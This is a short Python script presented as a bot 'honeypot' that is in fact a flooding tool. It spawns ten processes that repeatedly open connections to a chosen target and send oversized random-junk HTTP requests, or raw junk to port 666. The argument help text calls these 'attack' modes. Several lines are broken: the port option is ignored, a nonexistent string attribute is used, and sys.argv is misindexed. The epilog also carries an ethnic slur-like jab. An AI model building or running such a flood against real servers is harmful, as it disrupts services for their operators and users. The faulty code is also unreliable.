# Echo client program
import socket
import random
import string
import time
import sys
import multiprocessing
import argparse
import os


def parse():
    parser = argparse.ArgumentParser(
        description='Serve some sweet honey to the ubiquitous bots!',
        epilog='And that`s how you`d detect a sneaky chinese bot.',
        prog='mfh.py',
        )

    parser.add_argument(
        '-p',
        default=80,
        const=80,
        dest='port',
        help='port to attack',
        metavar='PORT',
        nargs='?',
        type=int,
        )

    parser.add_argument(
        '-t',
        default='127.0.0.1',
        const='127.0.0.1',
        dest='host',
        help='target host to attack',
        metavar='HOST',
        nargs='?',
        type=str,
        )

    parser.add_argument(
        '-m',
        default='http',
        const='http',
        dest='mode',
        help='attack mode',
        metavar='HOST',
        nargs='?',
        type=str,
        )

    return parser.parse_args()


def connect_http(host, port):
    while True:
        try:
            try:
                PORT = 80
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((host, PORT))
                N = 10000
                ptr = string.ascii_uppercase + string.digits
                ptr += "!@#$%^&*()_+`-~"
                request = 'GET /'.join(random.choice(ptr) for _ in range(N))
                request += 'HTTP/1.1'
                request += '\r\n'
                request += 'Content-Type: text/html'
                request += '\r\n'
                request += 'Content-Length: 1000000'
                request += '\r\n'
                request += '\r\n'
                request += ''.join(random.choice(ptr) for _ in range(N))
                s.send(request)
                print("-", end=' ')
            except socket.error:
                print("!", end=' ')
        except KeyboardInterrupt:
            os._exit(0)


def connect(host, port):
    while True:
        try:
            PORT = 666
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, PORT))
            N = 10000
            ptr = string.ascii
            request = ''.join(random.choice(ptr) for _ in range(N))
            s.send(request)
            print("-", end=' ')
        except:
            print("!", end=' ')

if __name__ == '__main__':
    multiprocessing.freeze_support()
    args = parse()
    processes = []
    if args.mode == 'http':
        mode = connect_http
    if args.mode == 'raw':
        mode = connect
    if 'p' in sys.argv:
        port = sys.argv['p']
    for i in range(10):
        processes.append(multiprocessing.Process(
            target=mode,
            args=(args.host, args.port)
            )
        )
        processes[i].start()
